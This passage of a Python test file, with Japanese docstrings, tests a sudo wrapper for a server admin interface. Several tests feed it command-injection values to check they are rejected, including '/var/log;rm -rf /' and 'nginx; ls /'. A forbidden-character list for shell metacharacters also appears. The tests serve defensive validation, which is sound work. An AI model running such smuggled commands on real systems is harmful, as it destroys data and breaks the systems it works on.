            wrapper.search_packages("nginx; ls /")

    def test_get_package_info(self, tmp_path):
        """get_package_info が info サブコマンドとパッケージ名で subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_package_info("nginx")
        args = mock_run.call_args[0][0]
        assert "info" in args
        assert "nginx" in args

    def test_get_package_info_forbidden_chars(self, tmp_path):
        """get_package_info が禁止文字を含むパッケージ名で ValueError を送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Forbidden character"):
            wrapper.get_package_info("nginx|ls")

    def test_get_packages_installed(self, tmp_path):
        """get_packages_installed が installed サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_packages_installed()
        assert "installed" in mock_run.call_args[0][0]

    def test_get_packages_security_updates(self, tmp_path):
        """get_packages_security_updates が security-updates サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_packages_security_updates()
        assert "security-updates" in mock_run.call_args[0][0]


# ===========================================================================
# TestPostfixExtendedMethods: Postfix拡張メソッドのテスト
# ===========================================================================


class TestPostfixExtendedMethods:
    """Postfix 拡張メソッド (queue-detail / config / stats) のテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-postfix.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "ok"})
        return m

    def test_get_postfix_queue_detail(self, tmp_path):
        """get_postfix_queue_detail が queue-detail コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postfix_queue_detail()
        assert "queue-detail" in mock_run.call_args[0][0]

    def test_get_postfix_config(self, tmp_path):
        """get_postfix_config が config コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postfix_config()
        assert "config" in mock_run.call_args[0][0]

    def test_get_postfix_stats(self, tmp_path):
        """get_postfix_stats が stats コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postfix_stats()
        assert "stats" in mock_run.call_args[0][0]


# ===========================================================================
# TestNetstatMethods: Netstatメソッドのテスト
# ===========================================================================


class TestNetstatMethods:
    """Netstat メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-netstat.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "ok"})
        return m

    def test_get_netstat_connections(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_netstat_connections()
        assert "connections" in mock_run.call_args[0][0]

    def test_get_netstat_listening(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_netstat_listening()
        assert "listening" in mock_run.call_args[0][0]

    def test_get_netstat_stats(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_netstat_stats()
        assert "stats" in mock_run.call_args[0][0]

    def test_get_netstat_routes(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_netstat_routes()
        assert "routes" in mock_run.call_args[0][0]


# ===========================================================================
# TestBINDMethods: BIND DNSメソッドのテスト
# ===========================================================================


class TestBINDMethods:
    """BIND DNS メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-bind.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "ok"})
        return m

    def test_get_bind_status(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bind_status()
        assert "status" in mock_run.call_args[0][0]

    def test_get_bind_zones(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bind_zones()
        assert "zones" in mock_run.call_args[0][0]

    def test_get_bind_config(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bind_config()
        assert "config" in mock_run.call_args[0][0]

    def test_get_bind_logs_default(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bind_logs()
        args = mock_run.call_args[0][0]
        assert "logs" in args
        assert "50" in args

    def test_get_bind_logs_clamp(self, tmp_path):
        """get_bind_logs が最大値200でクランプする"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bind_logs(lines=9999)
        assert "200" in mock_run.call_args[0][0]


# ===========================================================================
# TestPostgreSQLMethods: PostgreSQLメソッドのテスト
# ===========================================================================


class TestPostgreSQLMethods:
    """PostgreSQL メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-postgresql.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "active"})
        return m

    def test_get_postgresql_status(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postgresql_status()
        assert "status" in mock_run.call_args[0][0]

    def test_get_postgresql_databases(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postgresql_databases()
        assert "databases" in mock_run.call_args[0][0]

    def test_get_postgresql_users(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postgresql_users()
        assert "users" in mock_run.call_args[0][0]

    def test_get_postgresql_activity(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postgresql_activity()
        assert "activity" in mock_run.call_args[0][0]

    def test_get_postgresql_config(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postgresql_config()
        assert "config" in mock_run.call_args[0][0]

    def test_get_postgresql_logs(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postgresql_logs(lines=100)
        args = mock_run.call_args[0][0]
        assert "logs" in args
        assert "100" in args

    def test_get_postgresql_logs_clamp(self, tmp_path):
        """get_postgresql_logs が最大値200でクランプする"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postgresql_logs(lines=9999)
        assert "200" in mock_run.call_args[0][0]


# ===========================================================================
# TestMySQLMethods: MySQLメソッドのテスト
# ===========================================================================


class TestMySQLMethods:
    """MySQL メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-mysql.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "active"})
        return m

    def test_get_mysql_status(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_mysql_status()
        assert "status" in mock_run.call_args[0][0]

    def test_get_mysql_databases(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_mysql_databases()
        assert "databases" in mock_run.call_args[0][0]

    def test_get_mysql_users(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_mysql_users()
        assert "users" in mock_run.call_args[0][0]

    def test_get_mysql_processes(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_mysql_processes()
        assert "processlist" in mock_run.call_args[0][0]

    def test_get_mysql_variables(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_mysql_variables()
        assert "variables" in mock_run.call_args[0][0]

    def test_get_mysql_logs(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_mysql_logs(lines=75)
        args = mock_run.call_args[0][0]
        assert "logs" in args
        assert "75" in args

    def test_get_mysql_logs_clamp_min(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_mysql_logs(lines=0)
        assert "1" in mock_run.call_args[0][0]


# ===========================================================================
# TestSMARTMethods: SMARTドライブメソッドのテスト
# ===========================================================================


class TestSMARTMethods:
    """SMART drive メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-smart.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"disks": []})
        return m

    def test_get_smart_disks(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_smart_disks()
        assert "list" in mock_run.call_args[0][0]

    def test_get_smart_info(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_smart_info("/dev/sda")
        args = mock_run.call_args[0][0]
        assert "info" in args
        assert "/dev/sda" in args

    def test_get_smart_health(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_smart_health("/dev/sda")
        args = mock_run.call_args[0][0]
        assert "health" in args

    def test_get_smart_tests(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_smart_tests()
        assert "tests" in mock_run.call_args[0][0]


# ===========================================================================
# TestPartitionsMethods: パーティションメソッドのテスト
# ===========================================================================


class TestPartitionsMethods:
    """Partitions メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-partitions.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"partitions": []})
        return m

    def test_get_partitions_list(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_partitions_list()
        assert "list" in mock_run.call_args[0][0]

    def test_get_partitions_usage(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_partitions_usage()
        assert "usage" in mock_run.call_args[0][0]

    def test_get_partitions_detail(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_partitions_detail()
        assert "detail" in mock_run.call_args[0][0]


# ===========================================================================
# TestDHCPMethods: DHCPメソッドのテスト
# ===========================================================================


class TestDHCPMethods:
    """DHCP メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-dhcp.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "active"})
        return m

    def test_get_dhcp_status(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_dhcp_status()
        assert "status" in mock_run.call_args[0][0]

    def test_get_dhcp_leases(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_dhcp_leases()
        assert "leases" in mock_run.call_args[0][0]

    def test_get_dhcp_config(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_dhcp_config()
        assert "config" in mock_run.call_args[0][0]

    def test_get_dhcp_pools(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_dhcp_pools()
        assert "pools" in mock_run.call_args[0][0]

    def test_get_dhcp_logs(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_dhcp_logs(lines=100)
        args = mock_run.call_args[0][0]
        assert "logs" in args
        assert "100" in args

    def test_get_dhcp_logs_clamp(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_dhcp_logs(lines=999)
        assert "200" in mock_run.call_args[0][0]


# ===========================================================================
# TestSensorsMethods: センサーメソッドのテスト
# ===========================================================================


class TestSensorsMethods:
    """Sensors (lm-sensors) メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-sensors.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"sensors": {}})
        return m

    def test_get_sensors_all(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sensors_all()
        assert "all" in mock_run.call_args[0][0]

    def test_get_sensors_temperature(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sensors_temperature()
        assert "temperature" in mock_run.call_args[0][0]

    def test_get_sensors_fans(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sensors_fans()
        assert "fans" in mock_run.call_args[0][0]

    def test_get_sensors_voltage(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sensors_voltage()
        assert "voltage" in mock_run.call_args[0][0]


# ===========================================================================
# TestRoutingMethods: ルーティングメソッドのテスト
# ===========================================================================


class TestRoutingMethods:
    """Routing メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-routing.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"routes": []})
        return m

    def test_get_routing_routes(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_routing_routes()
        assert "routes" in mock_run.call_args[0][0]

    def test_get_routing_gateways(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_routing_gateways()
        assert "gateways" in mock_run.call_args[0][0]

    def test_get_routing_arp(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_routing_arp()
        assert "arp" in mock_run.call_args[0][0]

    def test_get_routing_interfaces(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_routing_interfaces()
        assert "interfaces" in mock_run.call_args[0][0]


# ===========================================================================
# TestSysconfigMethods: システム設定メソッドのテスト
# ===========================================================================


class TestSysconfigMethods:
    """Sysconfig メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-sysconfig.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"hostname": "server"})
        return m

    def test_get_sysconfig_hostname(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sysconfig_hostname()
        assert "hostname" in mock_run.call_args[0][0]

    def test_get_sysconfig_timezone(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sysconfig_timezone()
        assert "timezone" in mock_run.call_args[0][0]

    def test_get_sysconfig_locale(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sysconfig_locale()
        assert "locale" in mock_run.call_args[0][0]

    def test_get_sysconfig_kernel(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sysconfig_kernel()
        assert "kernel" in mock_run.call_args[0][0]

    def test_get_sysconfig_uptime(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sysconfig_uptime()
        assert "uptime" in mock_run.call_args[0][0]

    def test_get_sysconfig_modules(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sysconfig_modules()
        assert "modules" in mock_run.call_args[0][0]


# ===========================================================================
# TestNginxMethods: Nginxメソッドのテスト
# ===========================================================================


class TestNginxMethods:
    """Nginx メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-nginx.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "active"})
        return m

    def test_get_nginx_status(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_nginx_status()
        assert "status" in mock_run.call_args[0][0]

    def test_get_nginx_config(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_nginx_config()
        assert "config" in mock_run.call_args[0][0]

    def test_get_nginx_vhosts(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_nginx_vhosts()
        assert "vhosts" in mock_run.call_args[0][0]

    def test_get_nginx_connections(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_nginx_connections()
        assert "connections" in mock_run.call_args[0][0]

    def test_get_nginx_logs(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_nginx_logs(lines=80)
        args = mock_run.call_args[0][0]
        assert "logs" in args
        assert "80" in args

    def test_get_nginx_logs_clamp(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_nginx_logs(lines=9999)
        assert "200" in mock_run.call_args[0][0]


# ===========================================================================
# TestApacheExtendedMethods: Apache拡張メソッドのテスト
# ===========================================================================


class TestApacheExtendedMethods:
    """Apache 拡張メソッド (config / logs / vhosts-detail / ssl-certs) のテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-apache.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"config": ""})
        return m

    def test_get_apache_config(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_apache_config()
        assert "config" in mock_run.call_args[0][0]

    def test_get_apache_logs(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_apache_logs(lines=60)
        args = mock_run.call_args[0][0]
        assert "logs" in args
        assert "60" in args

    def test_get_apache_logs_clamp(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_apache_logs(lines=9999)
        assert "200" in mock_run.call_args[0][0]

    def test_get_apache_vhosts_detail(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_apache_vhosts_detail()
        assert "vhosts-detail" in mock_run.call_args[0][0]

    def test_get_apache_ssl_certs(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_apache_ssl_certs()
        assert "ssl-certs" in mock_run.call_args[0][0]


# ===========================================================================
# TestFileManagerMethods: ファイルマネージャーメソッドのテスト
# ===========================================================================


class TestFileManagerMethods:
    """File Manager メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-filemanager.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"files": []})
        return m

    def test_validate_filemanager_arg_valid(self, tmp_path):
        """_validate_filemanager_arg が正常な文字列でエラーなし"""
        wrapper = self._make_wrapper(tmp_path)
        wrapper._validate_filemanager_arg("/var/log/syslog")

    def test_validate_filemanager_arg_forbidden(self, tmp_path):
        """_validate_filemanager_arg が禁止文字で SudoWrapperError を送出する"""
        wrapper = self._make_wrapper(tmp_path)
        for char in [";", "|", "&", "$", "(", ")"]:
            with pytest.raises(SudoWrapperError, match="Forbidden character"):
                wrapper._validate_filemanager_arg(f"/path{char}file")

    def test_list_files(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.list_files("/var/log")
        args = mock_run.call_args[0][0]
        assert "list" in args
        assert "/var/log" in args

    def test_stat_file(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.stat_file("/var/log/syslog")
        args = mock_run.call_args[0][0]
        assert "stat" in args
        assert "/var/log/syslog" in args

    def test_read_file(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.read_file("/etc/hosts", lines=20)
        args = mock_run.call_args[0][0]
        assert "read" in args
        assert "20" in args

    def test_read_file_clamp(self, tmp_path):
        """read_file が最大200行でクランプする"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.read_file("/etc/hosts", lines=9999)
        assert "200" in mock_run.call_args[0][0]

    def test_search_files(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.search_files("/var/log", "syslog")
        args = mock_run.call_args[0][0]
        assert "search" in args
        assert "/var/log" in args

    def test_list_files_forbidden_path(self, tmp_path):
        """list_files が禁止文字を含むパスで SudoWrapperError を送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(SudoWrapperError):
            wrapper.list_files("/var/log;rm -rf /")


# ===========================================================================
# TestSSHKeysMethods: SSH鍵管理メソッドのテスト
# ===========================================================================


class TestSSHKeysMethods:
    """SSH Keys メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-sshkeys.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"keys": []})
        return m

    def test_get_ssh_keys(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_ssh_keys()
        assert "list-keys" in mock_run.call_args[0][0]

    def test_get_sshd_config(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sshd_config()
        assert "sshd-config" in mock_run.call_args[0][0]

    def test_get_ssh_host_keys(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_ssh_host_keys()
        assert "host-keys" in mock_run.call_args[0][0]

    def test_get_known_hosts_count(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_known_hosts_count()
        assert "auth-keys" in mock_run.call_args[0][0]


# ===========================================================================
# TestSecurityAuditMethods: セキュリティ監査メソッドのテスト
# ===========================================================================


class TestSecurityAuditMethods:
    """Security audit メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-security.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"report": {}})
        return m

    def test_get_security_audit_report(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_security_audit_report()
        assert "audit-report" in mock_run.call_args[0][0]

    def test_get_failed_logins(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_failed_logins()
        assert "failed-logins" in mock_run.call_args[0][0]

    def test_get_sudo_logs(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_sudo_logs()
        assert "sudo-logs" in mock_run.call_args[0][0]

    def test_get_open_ports(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_open_ports()
        assert "open-ports" in mock_run.call_args[0][0]


# ===========================================================================
# TestLogSearchMethods: ログ検索メソッドのテスト
# ===========================================================================


class TestLogSearchMethods:
    """Log search メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-logsearch.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"matches": []})
        return m

    def test_search_logs(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.search_logs("error", "syslog", 50)
        args = mock_run.call_args[0][0]
        assert "search" in args
        assert "error" in args
        assert "syslog" in args

    def test_search_logs_forbidden_pattern(self, tmp_path):
        """search_logs が禁止文字を含むパターンで SudoWrapperError を送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(SudoWrapperError):
            wrapper.search_logs("err|grep", "syslog", 50)

    def test_search_logs_forbidden_logfile(self, tmp_path):
        """search_logs が禁止文字を含むログファイル名で SudoWrapperError を送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(SudoWrapperError):
            wrapper.search_logs("error", "syslog;ls", 50)

    def test_list_log_files(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.list_log_files()
        assert "list-files" in mock_run.call_args[0][0]

    def test_get_recent_errors(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_recent_errors()
        assert "recent-errors" in mock_run.call_args[0][0]

    def test_get_log_tail_multi(self, tmp_path):
        """get_log_tail_multi が tail-multi サブコマンドを呼び出す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_log_tail_multi(20)
        assert "tail-multi" in mock_run.call_args[0][0]
        assert "20" in mock_run.call_args[0][0]

    def test_get_log_tail_multi_default_lines(self, tmp_path):
        """get_log_tail_multi のデフォルト lines=30 を確認"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_log_tail_multi()
        assert "30" in mock_run.call_args[0][0]


# ===========================================================================
# TestNetworkMethods: ネットワーク詳細メソッドのテスト
# ===========================================================================


class TestNetworkMethods:
    """Network detail メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-network.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"interfaces": []})
        return m

